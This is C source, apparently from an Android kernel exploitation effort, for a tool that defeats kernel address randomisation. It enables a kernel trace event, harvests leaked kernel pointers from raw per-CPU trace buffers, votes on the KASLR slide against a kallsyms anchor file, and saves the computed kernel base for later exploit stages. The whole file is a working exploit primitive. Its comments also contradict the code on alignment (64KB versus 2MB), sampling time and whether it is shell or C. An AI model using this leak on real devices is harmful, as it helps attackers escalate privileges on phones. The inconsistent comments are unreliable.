/* skslide2：纯 shell 取 KASLR slide（不产生被杀进程）
 * 方法：enable irq/tasklet_entry，O_NONBLOCK 读 per_cpu/cpuN/trace_pipe_raw 拿运行期
 *       函数地址 v；对每个 v 与本地 kallsyms 的每个函数入口 F 求差，
 *       slide 必为 64KB 对齐（本机实测；GhostKey 假定 2MiB 不适用）
 *       且落在 [0, SLIDE_MAX)，众数即 slide。
 * 依赖：/data/local/tmp/anchors.bin（u64 小端，kallsyms 文本段入口，已排序去重）
 * 与旧 kaslr_self.sh 区别：不用 timeout|head，不 kill 任何进程，正常 exit。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <poll.h>
#include <stdint.h>

#define TRACE "/sys/kernel/tracing"
#define TEXT_START 0xffffffc010000000ULL
#define TEXT_END 0xffffffc020000000ULL
#define SLIDE_MAX 0x4000000000ULL
#define ALIGN 0x200000ULL          /* 本机 KASLR 真实粒度：2MB */
#define SLIDE_BASE 0x80000ULL      /* 且 slide ≡ 0x80000 (mod 0x200000)，三次 boot 实测一致 */
#define NSLOT ((SLIDE_MAX - SLIDE_BASE) / ALIGN + 1)
#define MAXANCH 262144

static unsigned votes[NSLOT];
static uint64_t anch[MAXANCH];

static int wr(const char *p, const char *v)
{
    int fd = open(p, O_WRONLY | O_CLOEXEC);
    if (fd < 0) return -errno;
    ssize_t n = write(fd, v, strlen(v));
    int e = (n == (ssize_t)strlen(v)) ? 0 : -errno;
    close(fd);
    return e;
}

static int load_anchors(void)
{
    FILE *f = fopen("/data/local/tmp/anchors.bin", "rb");
    if (!f) return 0;
    int n = (int)fread(anch, 8, MAXANCH, f);
    fclose(f);
    return n;
}

int main(void)
{
    static unsigned char buf[1 << 20];
    int fds[16], nfd = 0;
    char old_on[8] = {0};

    int nanch = load_anchors();
    printf("[skslide2] anchors=%d\n", nanch);
    if (nanch <= 0) { printf("[skslide2] FAIL: 缺 anchors.bin\n"); return 1; }

    int of = open(TRACE "/tracing_on", O_RDONLY | O_CLOEXEC);
    if (of >= 0) { if (read(of, old_on, 4) <= 0) old_on[0] = 0; close(of); }

    for (int c = 0; c < 3; c++) {
        char p[128];
        snprintf(p, sizeof p, TRACE "/per_cpu/cpu%d/trace_pipe_raw", c);
        int f = open(p, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
        if (f >= 0) fds[nfd++] = f;
    }
    printf("[skslide2] raw fds=%d old_on=%.1s\n", nfd, old_on[0] ? old_on : "?");
    if (!nfd) return 1;

    long drained = 0;
    for (int i = 0; i < nfd; i++)
        for (;;) { ssize_t n = read(fds[i], buf, sizeof buf); if (n <= 0) break; drained += n; }
    printf("[skslide2] drained=%ld\n", drained);

    int re = wr(TRACE "/events/irq/tasklet_entry/enable", "1");
    int ro = wr(TRACE "/tracing_on", "1");
    printf("[skslide2] enable=%d on=%d\n", re, ro);
    if (re != 0) { printf("[skslide2] FAIL: tasklet_entry 不可写 (%d)\n", re); return 1; }

    /* 采样 5 秒 */
    long long total = 0, nk = 0;
    struct timespec ts, te;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    long long deadline = (long long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000 + 3000;
    while (1) {
        clock_gettime(CLOCK_MONOTONIC, &te);
        if ((long long)te.tv_sec * 1000 + te.tv_nsec / 1000000 > deadline) break;
        struct pollfd pf[16];
        for (int i = 0; i < nfd; i++) { pf[i].fd = fds[i]; pf[i].events = POLLIN; pf[i].revents = 0; }
        if (poll(pf, nfd, 50) <= 0) continue;
        for (int i = 0; i < nfd; i++) {
            if (!(pf[i].revents & POLLIN)) continue;
            ssize_t n = read(fds[i], buf, sizeof buf);
            if (n <= 0) continue;
            total += n;
            if (total > 4194304) { clock_gettime(CLOCK_MONOTONIC, &te); deadline = 0; }
            for (ssize_t o = 0; o + 8 <= n; o += 4) {
                uint64_t v;
                memcpy(&v, buf + o, 8);
                if ((v >> 48) != 0xffffULL) continue;
                nk++;
                /* v 为运行期内核地址：slide = v - (TEXT_START..TEXT_END) 内的符号地址 */
                if (v < TEXT_START) continue;
                if ((v - TEXT_START) >= 0x4010000000ULL) continue; /* 排除 vmemmap/fixmap */
                uint64_t slo = (v > TEXT_END) ? (v - TEXT_END) : 0;
                if (slo < SLIDE_BASE) slo = SLIDE_BASE;
                else slo = SLIDE_BASE + ((slo - SLIDE_BASE + ALIGN - 1) / ALIGN) * ALIGN;
                uint64_t shi = v - TEXT_START;
                for (uint64_t s = slo; s <= shi; s += ALIGN) {
                    uint64_t u = v - s;
                    int lo = 0, hi = nanch - 1, pos = -1;
                    while (lo <= hi) {
                        int mid = (lo + hi) / 2;
                        if (anch[mid] <= u) { pos = mid; lo = mid + 1; } else hi = mid - 1;
                    }
                    if (pos >= 0 && u == anch[pos]) votes[(s - SLIDE_BASE) / ALIGN]++;
                }
            }
        }
    }

    wr(TRACE "/events/irq/tasklet_entry/enable", "0");
    if (old_on[0] == '0') wr(TRACE "/tracing_on", "0");
    for (int i = 0; i < nfd; i++) close(fds[i]);

    int best = -1, second = -1, third = -1;
    for (int i = 0; i < (int)NSLOT; i++) {
        if (!votes[i]) continue;
        if (best < 0 || votes[i] > votes[best]) { third = second; second = best; best = i; }
        else if (second < 0 || votes[i] > votes[second]) { third = second; second = i; }
        else if (third < 0 || votes[i] > votes[third]) third = i;
    }

    printf("[skslide2] bytes=%lld kptrs=%lld", total, nk);
    if (best < 0) { printf(" -> FAIL: 无候选\n"); return 1; }
    printf(" top1=%u(0x%llx) top2=%u(0x%llx) top3=%u(0x%llx)\n", votes[best],
           (unsigned long long)(SLIDE_BASE + (uint64_t)best * ALIGN),
           second >= 0 ? votes[second] : 0,
           second >= 0 ? (unsigned long long)(SLIDE_BASE + (uint64_t)second * ALIGN) : 0ULL,
           third >= 0 ? votes[third] : 0,
           third >= 0 ? (unsigned long long)(SLIDE_BASE + (uint64_t)third * ALIGN) : 0ULL);

    uint64_t slide = SLIDE_BASE + (uint64_t)best * ALIGN;
    printf("[skslide2] slide=0x%llx base=0x%llx\n",
           (unsigned long long)slide, (unsigned long long)(0xffffffc010000000ULL + slide));

    int wf = open("/data/local/tmp/kaslr_base", O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
    if (wf >= 0) {
        char s[48];
        int L = snprintf(s, sizeof s, "0x%llx\n", (unsigned long long)(0xffffffc010000000ULL + slide));
        write(wf, s, L); close(wf);
    }
    return 0;
}
